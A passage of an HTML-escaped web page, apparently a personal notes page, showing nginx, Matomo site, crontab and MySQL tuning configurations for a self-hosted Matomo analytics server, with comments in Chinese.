style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eopen_file_cache_valid\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e30s\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eopen_file_cache_min_uses\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e# server_names_hash_bucket_size 64;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\t\u003cspan style=\"color:#75715e\"\u003e# server_name_in_redirect off;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003einclude\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/etc/nginx/mime.types\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003edefault_type\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eapplication/octet-stream\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e##\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\t\u003cspan style=\"color:#75715e\"\u003e# SSL Settings\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\t\u003cspan style=\"color:#75715e\"\u003e##\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003essl_protocols\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eTLSv1\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eTLSv1.1\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eTLSv1.2\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eTLSv1.3\u003c/span\u003e; \u003cspan style=\"color:#75715e\"\u003e# Dropping SSLv3, ref: POODLE\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\t\u003cspan style=\"color:#f92672\"\u003essl_prefer_server_ciphers\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e##\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\t\u003cspan style=\"color:#75715e\"\u003e# Logging Settings\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\t\u003cspan style=\"color:#75715e\"\u003e##\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003eaccess_log\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/var/log/nginx/access.log\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003eerror_log\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/var/log/nginx/error.log\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e##\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\t\u003cspan style=\"color:#75715e\"\u003e# Gzip Settings\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\t\u003cspan style=\"color:#75715e\"\u003e##\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003egzip\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003egzip_min_length\u003c/span\u003e  \u003cspan style=\"color:#ae81ff\"\u003e1024\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003egzip_comp_level\u003c/span\u003e  \u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003egzip_proxied\u003c/span\u003e     \u003cspan style=\"color:#e6db74\"\u003eany\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003egzip_types\u003c/span\u003e       \u003cspan style=\"color:#e6db74\"\u003etext/plain\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003etext/css\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eapplication/javascript\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eapplication/json\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eimage/svg+xml\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# 全域 expires 規則\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003eexpires\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e1d\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eadd_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eCache-Control\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;public\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e# gzip_vary on;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\t\u003cspan style=\"color:#75715e\"\u003e# gzip_proxied any;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\t\u003cspan style=\"color:#75715e\"\u003e# gzip_comp_level 6;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\t\u003cspan style=\"color:#75715e\"\u003e# gzip_buffers 16 8k;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\t\u003cspan style=\"color:#75715e\"\u003e# gzip_http_version 1.1;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\t\u003cspan style=\"color:#75715e\"\u003e# gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e##\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\t\u003cspan style=\"color:#75715e\"\u003e# Virtual Host Configs\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\t\u003cspan style=\"color:#75715e\"\u003e##\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003einclude\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/etc/nginx/conf.d/*.conf\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003einclude\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/etc/nginx/sites-enabled/*\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch6 id=\"matomoconf\"\u003ematomo.conf\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eserver\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003elisten\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e80\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eserver_name\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eanalytics.matomo.cc\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eroot\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/var/www/html/matomo\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eindex\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eindex.php\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eindex.html\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eaccess_log\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/var/log/nginx/matomo.access.log\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eerror_log\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003e/var/log/nginx/matomo.error.log\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ewarn\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003elocation\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003etry_files\u003c/span\u003e $uri $uri/ =\u003cspan style=\"color:#ae81ff\"\u003e404\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# Matomo Rewrite for pretty URLs\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003elocation\u003c/span\u003e ~ \u003cspan style=\"color:#e6db74\"\u003e^/(index|piwik|matomo)\\.php(/|$)\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003efastcgi_split_path_info\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e^(.+\\.php)(/.*)\u003c/span\u003e$;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003efastcgi_pass\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eunix:/run/php/php8.1-fpm.sock\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003einclude\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003efastcgi_params\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003efastcgi_param\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ePATH_INFO\u003c/span\u003e $fastcgi_path_info;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003efastcgi_param\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eSCRIPT_FILENAME\u003c/span\u003e $document_root$fastcgi_script_name;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003efastcgi_param\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eHTTPS\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eoff\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e# 緩衝區\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e        \u003cspan style=\"color:#f92672\"\u003efastcgi_buffers\u003c/span\u003e           \u003cspan style=\"color:#ae81ff\"\u003e16\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e16k\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003efastcgi_buffer_size\u003c/span\u003e       \u003cspan style=\"color:#ae81ff\"\u003e32k\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003efastcgi_busy_buffers_size\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e64k\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003efastcgi_temp_file_write_size\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e64k\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e# 逾時\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e        \u003cspan style=\"color:#f92672\"\u003efastcgi_read_timeout\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e300\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003efastcgi_connect_timeout\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e60\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003efastcgi_send_timeout\u003c/span\u003e    \u003cspan style=\"color:#ae81ff\"\u003e60\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e# 加速 HEAD 請求\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e        \u003cspan style=\"color:#f92672\"\u003efastcgi_ignore_headers\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003eX-Accel-Buffering\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# 靜態檔案快取\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003elocation\u003c/span\u003e ~\u003cspan style=\"color:#e6db74\"\u003e*\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\\.(js|woff2?|ttf|css|png|jpg|jpeg|gif|ico|svg)\u003c/span\u003e$ {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eexpires\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003emax\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003eaccess_log\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eoff\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003elog_not_found\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eoff\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# 安全：拒絕存取 .ht*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003elocation\u003c/span\u003e ~ \u003cspan style=\"color:#e6db74\"\u003e/\\.ht\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003edeny\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eall\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch6 id=\"crontab\"\u003ecrontab\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e*/5 * * * * php /var/www/html/matomo/console core:archive --force-all-websites \u0026gt; /var/log/matomo-archive.log 2\u0026gt;\u0026amp;\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eMySQL\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 臨時表大小 - 可以設定更大\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003etmp_table_size\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e2147483648      # 2GB (約記憶體的3-4%)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003emax_heap_table_size\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e2147483648 # 2GB (必須與 tmp_table_size 相同)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 排序緩衝區 - 每個連線獨立使用\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003esort_buffer_size\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e4194304       # 4MB (不要太大，會佔用過多記憶體)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 讀取緩衝區\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eread_buffer_size\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e2097152       # 2MB (你的設定已經合適)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eread_rnd_buffer_size\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e8388608   # 8MB (可以稍微增大)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 連線緩衝區\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ejoin_buffer_size\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e8388608       # 8MB\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ebulk_insert_buffer_size\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e67108864 # 64MB\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# InnoDB 相關\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003einnodb_buffer_pool_size\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e42949672960  # 40GB (約記憶體的60-65%)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003einnodb_log_file_size\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e2147483648      # 2GB\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003einnodb_log_buffer_size\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e67108864      # 64MB\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan 